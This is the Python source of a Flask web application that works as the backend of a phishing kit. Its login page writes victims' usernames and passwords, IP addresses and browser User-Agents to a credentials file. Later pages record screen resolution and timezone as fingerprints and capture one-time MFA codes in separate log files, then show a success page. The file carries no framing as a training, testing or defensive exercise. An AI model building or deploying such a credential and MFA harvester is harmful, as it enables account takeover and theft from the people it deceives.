from flask import Flask, render_template, request, redirect, url_for
import os
from datetime import datetime

app = Flask(__name__)

# Ensure data directory exists
os.makedirs('captured_data', exist_ok=True)

def log_data(filename, data):
    with open(f'captured_data/{filename}', 'a') as file:
        timestamp = datetime.utcnow().isoformat()
        file.write(f"{timestamp} | {data}\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip = request.remote_addr
        ua = request.headers.get('User-Agent')

        log_data('credentials.txt', f"{username}:{password} | IP: {ip} | UA: {ua}")
        return redirect(url_for('security'))

    return render_template('login.html')

@app.route('/security', methods=['GET', 'POST'])
def security():
    if request.method == 'POST':
        # Could include fingerprinting info
        resolution = request.form.get('screen_resolution')
        timezone = request.form.get('timezone')
        log_data('fingerprints.txt', f"Resolution: {resolution} | Timezone: {timezone}")
        return redirect(url_for('mfa'))

    return render_template('security.html')

@app.route('/mfa', methods=['GET', 'POST'])
def mfa():
    if request.method == 'POST':
        code = request.form.get('mfa_code')
        log_data('mfa_codes.txt', f"Code: {code}")
        return redirect(url_for('success'))

    return render_template('mfa.html')

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    app.run(debug=True)
